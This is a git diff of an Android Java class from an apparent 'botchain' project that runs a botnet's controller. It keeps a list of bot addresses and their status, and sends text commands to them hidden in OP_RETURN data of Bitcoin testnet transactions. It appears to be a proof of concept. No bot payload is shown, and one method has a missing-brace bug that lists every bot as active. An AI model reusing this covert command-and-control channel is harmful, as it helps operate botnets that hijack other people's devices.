@@ -2,28 +2,35 @@ package com.example.tonipagliaro.botchain;
 
 import android.app.Application;
 import android.app.backup.BackupManager;
+import android.content.res.Resources;
 import android.os.Environment;
 import android.util.Log;
 
 import org.bitcoinj.core.Address;
 import org.bitcoinj.core.BlockChain;
+import org.bitcoinj.core.Coin;
 import org.bitcoinj.core.ECKey;
 import org.bitcoinj.core.NetworkParameters;
 import org.bitcoinj.core.PeerGroup;
+import org.bitcoinj.core.Transaction;
 import org.bitcoinj.net.discovery.DnsDiscovery;
 import org.bitcoinj.net.discovery.PeerDiscovery;
 import org.bitcoinj.params.TestNet3Params;
+import org.bitcoinj.script.ScriptBuilder;
 import org.bitcoinj.store.BlockStoreException;
 import org.bitcoinj.store.SPVBlockStore;
+import org.bitcoinj.wallet.SendRequest;
 import org.bitcoinj.wallet.UnreadableWalletException;
 import org.bitcoinj.wallet.Wallet;
 
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.util.ArrayList;
@@ -42,6 +49,7 @@ public class ApplicationState extends Application {
 
     File keychainFile;
 
+
     NetworkParameters params = TestNet3Params.get();
 
     private PeerDiscovery peerDiscovery;
@@ -52,8 +60,9 @@ public class ApplicationState extends Application {
     //Aggiunte
     PeerGroup peerGroup;
 
-    ArrayList<String> indirizzi=new ArrayList<String>();
+    ArrayList<Address> indirizzi=new ArrayList<Address>();
 
+    File fileMapAddress;
     Map<String,String> mappaIndirizzi=new HashMap<String, String>() ;
 
     private BackupManager backupManager;
@@ -64,17 +73,26 @@ public class ApplicationState extends Application {
     public void onCreate() {
         super.onCreate();
 
-        Address luca =new Address(params,"mvSWLyXqcQxouanZMtUbv5wmJnsBt3bfSj");
-      Address peppe=new Address(params,"mgCryBENg88N6HfJieZNa7xcT9wZS6dwe3");
-        indirizzi.add(luca.toString());
-       indirizzi.add(peppe.toString());
-
-        for(String s : indirizzi)
-            mappaIndirizzi.put(s,"no");
+        //SI prendono gli indirizzi dei bot dalle risorse xml e si aggiungono alla lista "indirizzi"
+        Resources res = getResources();
+        String[] bots = res.getStringArray(R.array.botList);
+        for (String s: bots) {
+            indirizzi.add(new Address(params, s));
+            mappaIndirizzi.put(s,"ok");
+        }
 
         Log.d("App", "Start app state");
         ApplicationState.current = this;
         backupManager = new BackupManager(this);
+
+        fileMapAddress = new File(getFilesDir(), "map_address.bots");
+
+        //Leggiamo il file che tiene traccia dei bot attivi (SE ESISTE)
+        if (!fileMapAddress.exists())
+            saveMappaIndirizzi();
+
+        loadMappaIndirizzi();
+
 
         //Leggiamo o creiamo il wallet
         synchronized (ApplicationState.walletFileLock) {
@@ -203,5 +221,115 @@ public class ApplicationState extends Application {
         return (ArrayList<InetSocketAddress>) isas.clone();
     }
     */
+
+    public void setStatoBots(String stato) {
+        for (String s : mappaIndirizzi.keySet()) {
+            mappaIndirizzi.put(s, stato);
+        }
+        saveMappaIndirizzi();
+    }
+
+    public void saveMappaIndirizzi() {
+        try {
+            Log.d("App", "SCRIVO IL FILE");
+            FileOutputStream fos = new FileOutputStream(fileMapAddress);
+            ObjectOutputStream oos = new ObjectOutputStream(fos);
+            oos.writeObject(mappaIndirizzi);
+            oos.close();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void loadMappaIndirizzi() {
+        if (fileMapAddress.exists())
+            try
+            {
+                Log.d("App", "Leggo il file della mappa degli indirizzi");
+                FileInputStream fileInputStream = new FileInputStream(fileMapAddress);
+                ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+                HashMap<String, String> map = (HashMap<String,String>)objectInputStream.readObject();
+                for (String s: map.keySet()) {
+                    mappaIndirizzi.put(s, map.get(s));
+                    Log.d("App", "MAPPA INDIRIZZI LETTA DAL FILE: " +s + " VALORE " + mappaIndirizzi.get(s));
+                }
+            }
+            catch(ClassNotFoundException | IOException | ClassCastException e) {
+                e.printStackTrace();
+            }
+    }
+
+    public ArrayList<Address> getBotStateOk() {
+        ArrayList<Address> listaBotOk = new ArrayList<Address>();
+        for (String s : mappaIndirizzi.keySet()) {
+            if (mappaIndirizzi.get(s).equalsIgnoreCase("ok"))
+                Log.d("App", "BOT CON STATO OK: " +s);
+                listaBotOk.add(new Address(params, s));
+        }
+        return listaBotOk;
+    }
+
+    public ArrayList<Address> getBotStateNo() {
+        ArrayList<Address> listaBotNo = new ArrayList<Address>();
+        for (String s : mappaIndirizzi.keySet()) {
+            if (mappaIndirizzi.get(s).equalsIgnoreCase("no")) {
+                listaBotNo.add(new Address(params, s));
+            }
+        }
+        return listaBotNo;
+    }
+
+
+    public  String sendCommand(String command, ArrayList<Address> botAddressList) throws Exception {
+
+        byte[] hash = command.getBytes("UTF-8");
+
+        Transaction transaction = new Transaction( wallet.getParams());
+
+        for (Address address : botAddressList) {
+            transaction.addOutput(Coin.MILLICOIN, address);
+        }
+        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
+
+        SendRequest sendRequest = SendRequest.forTx(transaction);
+
+        String string = new String(hash);
+        System.out.println("Sending ... " +string);
+
+        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException
+
+        peerGroup.setMaxConnections(botAddressList.size());
+        peerGroup.broadcastTransaction(sendRequest.tx);
+
+        return transaction.getHashAsString();
+    }
+
+
+    public  String sendCommand(String command, Address botAddress) throws Exception {
+
+        Log.d("App", "INVIO UN COMANDO");
+        byte[] hash = command.getBytes("UTF-8");
+
+        Transaction transaction = new Transaction(wallet.getParams());
+
+        transaction.addOutput(Coin.MILLICOIN, botAddress);
+        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
+
+
+        SendRequest sendRequest = SendRequest.forTx(transaction);
+
+        String string = new String(hash);
+        System.out.println("Sending ... " + string);
+
+        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException
+
+        peerGroup.setMaxConnections(1);
+        peerGroup.broadcastTransaction(sendRequest.tx);
+
+        return transaction.getHashAsString();
+    }
+
 
 }
